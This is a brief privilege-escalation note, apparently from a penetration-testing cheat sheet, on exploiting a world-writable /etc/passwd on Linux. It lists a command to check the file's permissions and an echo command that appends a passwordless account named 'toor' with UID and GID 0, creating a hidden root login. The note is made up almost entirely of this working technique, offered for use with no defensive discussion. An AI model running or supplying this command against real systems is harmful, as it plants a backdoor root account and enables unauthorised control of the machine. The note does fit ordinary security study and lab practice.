# Privilege Escalation Method - Writable /etc/passwd

## Vulnerability  
The vulnerability stems from write permissions on `/etc/passwd`, which allows modification of entries and thus escalation to root privileges.

## Conditions
- `/etc/passwd` is writable by the compromised user  

## Exploitation and Key Commands
- Verify write permissions:
```bash
ls -l /etc/passwd
```
- Append entry with root UID 0 and GUID 0
```bash
echo 'toor::0:0:root:/root:/bin/sh' >> /etc/passwd
```
